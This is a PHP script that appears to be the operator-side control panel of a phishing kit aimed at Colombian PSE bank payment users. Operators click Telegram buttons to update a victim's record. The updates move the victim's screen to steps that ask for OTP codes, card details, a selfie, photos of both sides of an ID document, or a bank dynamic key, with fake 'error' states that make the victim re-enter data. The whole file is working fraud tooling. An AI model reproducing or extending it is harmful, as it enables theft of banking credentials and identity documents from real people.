<?php
// actualizar_estado.php — Actualizador directo de estado desde botones Telegram
header('Content-Type: text/html; charset=UTF-8');
header('X-Content-Type-Options: nosniff');

$config = require_once __DIR__ . '/../../config/config.php';

if (!isset($_GET['id']) || !isset($_GET['estado'])) {
    header('Location: ../../index.php');
    exit;
}

$clienteId = intval($_GET['id']);
$nuevoEstado = intval($_GET['estado']);

$actionNames = [
    1  => '⏳ Espera',
    2  => '❌ Error Login',
    3  => '🔑 Pedir OTP',
    4  => '⚠️ OTP Error',
    5  => '💳 Pedir Tarjeta',
    6  => '⚠️ Tarjeta Error',
    7  => '✅ Finalizar',
    8  => '📲 WhatsApp',
    9  => '🤳 Selfie',
    10 => '⚠️ Selfie Error',
    11 => '🪪 Doc Frente',
    12 => '🪪 Doc Reverso',
    13 => '⚠️ Doc Frente Error',
    14 => '⚠️ Doc Reverso Error',
    15 => '🔐 Dinámica',
    16 => '⚠️ Dinámica Error'
];
$accion = $actionNames[$nuevoEstado] ?? "Estado #{$nuevoEstado}";

try {
    $pdo = require __DIR__ . '/../../config/db.php';
    $sql = "UPDATE pse SET estado = :estado WHERE id = :id";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':estado' => $nuevoEstado, ':id' => $clienteId]);
} catch (Exception $e) {
    error_log('[actualizar_estado] Error: ' . $e->getMessage());
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Estado Actualizado</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #0f172a;
            color: #f8fafc;
            text-align: center;
            padding: 1rem;
        }
        .card {
            background: #1e293b;
            padding: 2.5rem 2rem;
            border-radius: 16px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
            max-width: 380px;
            width: 100%;
            border: 1px solid #334155;
        }
        .icon {
            font-size: 3rem;
            margin-bottom: 1rem;
        }
        h2 {
            margin: 0 0 0.5rem 0;
            color: #10b981;
            font-size: 1.5rem;
        }
        p {
            color: #94a3b8;
            font-size: 0.95rem;
            margin: 0.5rem 0 1.5rem 0;
            line-height: 1.4;
        }
        .badge {
            display: inline-block;
            background: #334155;
            color: #f8fafc;
            padding: 0.4rem 0.8rem;
            border-radius: 9999px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">⚡</div>
        <h2>Acción Ejecutada</h2>
        <div class="badge"><?php echo htmlspecialchars($accion); ?></div>
        <p>Cliente ID <strong>#<?php echo $clienteId; ?></strong> actualizado.<br>La pantalla del usuario pasará a la siguiente vista de inmediato.</p>
        <p><small style="color: #64748b;">Puedes cerrar esta pestaña</small></p>
    </div>
    <script>
        setTimeout(() => {
            window.close();
        }, 1500);
    </script>
</body>
</html>